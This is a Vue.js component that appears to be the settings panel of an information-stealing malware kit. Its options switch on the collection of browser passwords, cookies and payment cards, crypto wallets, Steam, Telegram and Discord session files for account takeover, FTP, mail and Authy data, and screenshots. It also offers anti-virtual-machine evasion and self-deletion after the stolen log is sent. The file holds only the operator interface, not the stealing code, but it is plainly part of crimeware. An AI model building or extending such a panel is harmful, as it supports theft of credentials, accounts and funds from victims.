<template>
    <card card-body-classes="table-full-width" no-footer-line v-loading="isLoading">
      <h4 slot="header" class="card-title">Config</h4>

      <div class="row ml-2 mr-2">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.chromium ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
          <div class="ml-3 mr-3">
            <el-checkbox v-model="config.chromium" label="Chromium"></el-checkbox>
            <p>Grab passwords, cookies, forms, cards from chromium-based browsers</p>
          </div>
        </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.gecko ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
          <div class="ml-3 mr-3">
            <el-checkbox v-model="config.gecko" label="Gecko"></el-checkbox>
            <p>Grab passwords, cookies, forms, cards from gecko-based browsers</p>
          </div>
        </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.edge ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
          <div class="ml-3 mr-3">
            <el-checkbox v-model="config.edge" label="Edge"></el-checkbox>
            <p>Grab passwords, cookies from Internet Explorer/Edge</p>
          </div>
        </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.history ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.history" label="History"></el-checkbox>
              <p>Supported Chromium/Gecko-based browsers</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.sys_info ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.sys_info" label="System Info"></el-checkbox>
              <p>Grab info about system</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.screenshot ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.screenshot" label="Screenshot"></el-checkbox>
              <p>Grab screenshot. Support multiple monitors</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.crypto_wallets ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.crypto_wallets" label="Crypto Wallets"></el-checkbox>
              <p>Supported wallets: Electrum, MultiBit, Armory, Ethereum, Bytecoin, Jaxx, Jaxx Liberty, Atomic, Exodus, DashCore, Bitcoin, Wasabi, Daedalus, Monero</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.steam ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.steam" label="Steam"></el-checkbox>
              <p>Grab Steam session files (ssfn, vdf). Can be used for authorization</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.telegram ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.telegram" label="Telegram"></el-checkbox>
              <p>Grab Telegram session files. Can be used for authorization</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.discord ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.discord" label="Discord"></el-checkbox>
              <p>Grab Discord session files. Can be used for authorization</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.jabber ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.jabber" label="Jabber"></el-checkbox>
              <p>Grab Jabber accounts. Supported client: Pidgin, Psi, Psi+</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.foxmail ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.foxmail" label="Foxmail"></el-checkbox>
              <p>Grab Foxmail accounts</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.outlook ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.outlook" label="Outlook"></el-checkbox>
              <p>Grab Outlook accounts</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.file_zilla ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.file_zilla" label="FileZilla"></el-checkbox>
              <p>Grab FileZilla servers data (recentservers.xml, sitemanager.xml)</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.win_scp ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.win_scp" label="WinSCP"></el-checkbox>
              <p>Grab WinSCP accounts</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.authy ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.authy" label="Authy"></el-checkbox>
              <p>Grab Authy (analog Google Autentificator)</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.nord_vpn ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.nord_vpn" label="NordVPN"></el-checkbox>
              <p>Grab NordVPN vpn client</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.Anti_vm ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.Anti_vm" label="Anti VM"></el-checkbox>
              <p>Do not run on virtual machines and windows-servers</p>
            </div>
          </div>
        </div>
      </div>

      <div class="row ml-2 mr-2 mt-3">
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.max_files_size ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-input-number v-model="config.max_files_size" size="small" class="mt-2 mb-2"></el-input-number>
              <p>Max size grabbed files in KB (for FileGrabber)</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
          <div style="border-radius: 4px;" :style="config.self_delete ? 'border: 1px solid #409EFF;' : 'border: 1px solid #DCDFE6;'">
            <div class="ml-3 mr-3">
              <el-checkbox v-model="config.self_delete" label="Self Delete"></el-checkbox>
              <p>Self delete after sending log</p>
            </div>
          </div>
        </div>
        <div class="col-md-4">
        </div>
      </div>

      <div slot="footer">
        <el-button type="primary" v-on:click="updateConfig()">Update config</el-button>
      </div>
    </card>
</template>

<script>
import {Card} from 'src/components'
import store from 'src/store'

export default {
  components: {
    Card
  },
  data() {
    return {
      isLoading: true,
      config: {}
    }
  },
  async mounted() {
    this.isLoading = true;
    if (!this.$store.getters.CONFIG.length) {
     await this.$store.dispatch('GET_CONFIG');
    }
    this.config = this.$store.getters.CONFIG;
    this.isLoading = false;
  },
  methods: {
    async updateConfig() {
      this.isLoading = true;
      await this.$store.dispatch('UPDATE_CONFIG', this.config);
      this.isLoading = false;
      const err = this.$store.getters.GET_LAST_ERROR;
      if (!err) {
        this.$notify.success({title: 'Success', message: 'Config updated success!', duration:3000});
      } else {
        this.$notify.error({title: 'Error', message: err, duration:3000});
        this.$store.commit('SET_LAST_ERROR', null);
      }
    }
  },
}
</script>

<style scoped>
.el-checkbox {
  padding-top:10px;
}
</style>
